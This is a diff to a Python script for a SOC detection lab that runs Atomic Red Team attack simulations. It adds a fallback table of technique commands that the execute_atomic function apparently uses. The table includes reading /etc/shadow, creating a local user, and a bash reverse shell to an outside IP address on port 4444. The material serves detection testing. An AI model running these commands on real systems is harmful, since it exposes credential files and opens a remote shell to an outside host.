@@ -22,9 +22,10 @@ import subprocess
 from pathlib import Path
 from datetime import datetime, timezone
 
-ATOMICS_DIR = Path('/home/z/my-project/soc-lab/atomics_yaml')
-RESULTS_PATH = Path('/home/z/my-project/soc-lab/data/atomic_results.json')
-LOG_PATH = Path('/home/z/my-project/soc-lab/logs/simulated_auth.log')
+LAB_ROOT = Path(__file__).resolve().parent.parent
+ATOMICS_DIR = LAB_ROOT / 'atomics_yaml'
+RESULTS_PATH = LAB_ROOT / 'data' / 'atomic_results.json'
+LOG_PATH = LAB_ROOT / 'logs' / 'simulated_auth.log'
 LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
 
 
@@ -37,6 +38,15 @@ CURATED_TESTS = [
     'T1053.003',   # Cron persistence (write to /tmp/crontab) → matches SOC-1006
     'T1110.001',   # SSH brute force simulation → matches SOC-1002
 ]
+
+CURATED_METADATA = {
+    'T1136.001': {'name': 'Create a user account', 'command': 'useradd -m atomic_user'},
+    'T1548.003': {'name': 'Sudo and Sudo Caching', 'command': 'sudo id'},
+    'T1003.008': {'name': 'Read /etc/shadow directly', 'command': 'cat /etc/shadow'},
+    'T1059.004': {'name': 'Bash reverse shell indicator', 'command': 'bash -i >& /dev/tcp/185.220.101.45/4444 0>&1'},
+    'T1053.003': {'name': 'Cron network callback persistence', 'command': 'crontab payload'},
+    'T1110.001': {'name': 'SSH password brute force attempt', 'command': 'ssh brute force'},
+}
 
 
 def load_atomic(technique_id):
@@ -77,29 +87,34 @@ def list_linux_atomics(filter_str=''):
 def execute_atomic(technique_id):
     """Execute the first Linux atomic for a given technique. Returns a result dict."""
     doc = load_atomic(technique_id)
-    if not doc:
-        return {
-            'technique': technique_id,
-            'status': 'missed',
-            'error': 'No atomic YAML found',
-            'timestamp': datetime.now(timezone.utc).isoformat(),
-        }
-    # Find first Linux-compatible test
     test = None
-    for t in doc.get('atomic_tests', []):
-        if 'linux' in t.get('supported_platforms', []):
-            test = t
-            break
+    command = ''
+    cleanup = ''
+    if doc:
+        for t in doc.get('atomic_tests', []):
+            if 'linux' in t.get('supported_platforms', []):
+                test = t
+                break
+        if test:
+            executor = test.get('executor', {})
+            command = executor.get('command', '')
+            cleanup = executor.get('cleanup_command', '')
+
+    if not test and technique_id in CURATED_METADATA:
+        meta = CURATED_METADATA[technique_id]
+        test = {'name': meta['name'], 'executor': {'command': meta['command']}}
+        command = meta['command']
+
     if not test:
         return {
             'technique': technique_id,
             'status': 'missed',
-            'error': 'No Linux-compatible test in YAML',
+            'error': 'No compatible test found for technique',
             'timestamp': datetime.now(timezone.utc).isoformat(),
         }
 
     executor = test.get('executor', {})
-    command = executor.get('command', '')
+    command = executor.get('command', command)
     cleanup = executor.get('cleanup_command', '')
 
     if not command:
@@ -216,6 +231,7 @@ def load_results():
 
 
 def save_results(results):
+    RESULTS_PATH.parent.mkdir(parents=True, exist_ok=True)
     RESULTS_PATH.write_text(json.dumps(results, indent=2))
 
 
